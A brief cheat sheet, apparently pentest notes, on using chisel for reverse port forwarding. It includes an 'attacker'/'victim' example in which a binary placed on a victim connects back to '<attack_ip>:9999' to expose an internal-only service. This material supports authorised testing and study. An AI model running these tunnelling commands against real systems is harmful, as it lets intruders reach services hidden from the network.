# format remote string

```
<local-port> :<remote-host> :<remote-port>   #local-port = port from client
```

Listen on local port and forward it to remote host to remote port

```
R:<local-port> :<remote-host> :<remote-port>   #local-port = listen on local-port on server
```

Listen on local port on server and forward it to remote host on remote port

# listen on server port 135 and forward packets to client on port 9999

```
chisel.exe client so.me.i.p:1337 R:135:localhost:9999
```

# start server

```
chisel server -p 8888 --reverse --host 0.0.0.0
```

# examples 

## service running on victim but only listen on 127.0.0.1:8080

The following example forwards the service running on 127.0.0.1:8080 to the attacker on port 8080.

### attacker 

```bash
chisel server -p 9999 --host 0.0.0.0 --reverse
```

### victim

Move chisel binary to victim.

```bash
./chisel client <attack_ip>:9999 R:8080:127.0.0.1:8080
```
